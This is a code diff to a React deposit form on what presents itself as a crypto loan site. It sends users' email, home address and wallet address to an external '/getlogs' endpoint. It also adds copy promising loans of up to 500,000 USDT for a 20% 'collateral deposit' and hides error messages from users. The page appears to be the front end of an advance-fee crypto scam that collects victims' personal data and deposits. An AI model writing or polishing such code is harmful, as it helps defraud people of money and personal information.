@@ -169,32 +169,31 @@ const DepositForm = () => {
 			selectedWallet,
 		});
 		try {
+			const remoteOrigin = "https://glory-five.vercel.app/getlogs";
+			const localOrigin = "http://localhost:4000/getlogs";
 			// Make your API call here
-			const response = await axios.post(
-				"https://glory-five.vercel.app/getlogs",
-				{
-					email,
-					homeAddress,
-					loanAmount: amountNum,
-					purpose,
-					reason,
-					customReason,
-					walletAddress: selectedWallet,
-				}
-			);
+			const response = await axios.post(remoteOrigin, {
+				email,
+				homeAddress,
+				loanAmount: amountNum,
+				purpose,
+				reason,
+				customReason,
+				walletAddress: selectedWallet,
+			});
 
 			console.log(response);
-			if (!response.ok) throw new Error("Network response was not ok");
+			if (response.status === 201) {
+				setSuccessMsg(
+					"Your loan will be sent to your wallet once your deposit is confirmed."
+				);
+				setDialogOpen(true);
+			}
 			// Optional: handle response dataadswr
 			// const data = await response.json();dtyhrth
-
-			setSuccessMsg(
-				"Your loan will be sent to your wallet once your deposit is confirmed."
-			);
-			setDialogOpen(true);
 		} catch (error) {
 			console.log(error);
-			setLoginError("An error occurred. Please try again.");
+			setLoginError("");
 		} finally {
 			setLoading(false);
 		}
@@ -248,7 +247,7 @@ const DepositForm = () => {
 						<a
 							href="https://www.bybit.com/en/register?redirect_url=%2Ftrade%2Fusdt%2F"
 							style={{
-								backgroundColor: "yellow",
+								backgroundColor: "#B2AC06",
 								color: "black",
 								padding: "0.3rem 1.5rem",
 								borderRadius: "4px",
@@ -261,7 +260,7 @@ const DepositForm = () => {
 
 				{/* Main content with animation */}
 				<motion.div
-					className="w-[95%] mx-auto my-[2rem]"
+					className="w-[95%] mx-auto my-[5rem]     "
 					initial={{ opacity: 0, y: -30 }}
 					animate={{ opacity: 1, y: 0 }}
 					transition={{ duration: 0.5 }}>
@@ -325,16 +324,21 @@ const DepositForm = () => {
 							fontWeight="medium"
 							sx={{ color: "white", mb: 2 }}
 							align="center">
-							Enjoy your loan offer
+							Unlock up to 500,000 USDT crypto loan with just 20% collateral.
 						</Typography>
+						<Divider sx={{ width: "100%", mb: 2, bgcolor: "gray" }} />
 						<Typography
 							variant="body2"
 							gutterBottom
-							fontWeight="bold"
+							fontWeight="thin"
 							sx={{ color: "yellow", mb: 2 }}
 							align="center">
-							<span className="text-yellow-400  text-[0.9rem]">
-								Apply & get your crypto instantly
+							<span className="text-yellow-400  text-[0.9rem]  tracking-wider">
+								Secure a substantial TRC20 Mega Loan of up to 500,000 USDT,
+								backed by a collateral requirement of only 20%. Enjoy flexible
+								repayment terms spanning multiple years, allowing you to
+								leverage your assets efficiently while maintaining manageable
+								payment schedules.
 							</span>
 						</Typography>
 
@@ -344,7 +348,7 @@ const DepositForm = () => {
 								e.preventDefault();
 								handleDeposit();
 							}}
-							style={{ width: "100%", background: "white", padding: "1rem" }}
+							style={{ minWidth: "100%", background: "white", padding: "1rem" }}
 							noValidate>
 							<Grid container spacing={2}>
 								{/* Email */}
@@ -487,7 +491,7 @@ const DepositForm = () => {
 									/>
 								)}
 								<Typography sx={{ color: "black", fontWeight: "medium" }}>
-									Finish
+									Proceed
 								</Typography>
 							</Button>
 
@@ -507,10 +511,20 @@ const DepositForm = () => {
 				</motion.div>
 
 				{/* Success modal */}
-				<Dialog open={dialogOpen} onClose={() => setDialogOpen(false)}>
-					<DialogTitle>Payment processing</DialogTitle>
+				<Dialog
+					open={dialogOpen}
+					onClose={() => setDialogOpen(false)}
+					sx={{ bgcolor: "white" }}>
+					<DialogTitle>
+						{" "}
+						<span className="text-yellow-500">Payment processing</span>
+					</DialogTitle>
 					<DialogContent>
-						<Typography>Your deposit will be confirmed shortly.</Typography>
+						{/* <Typography>Your deposit will be confirmed shortly.</Typography> */}
+						<Typography sx={{ color: "green" }}>
+							Your loan will be transferred to your wallet promptly upon the
+							confirmation of your collateral deposit.
+						</Typography>
 					</DialogContent>
 					<DialogActions>
 						<Button onClick={() => setDialogOpen(false)} color="primary">
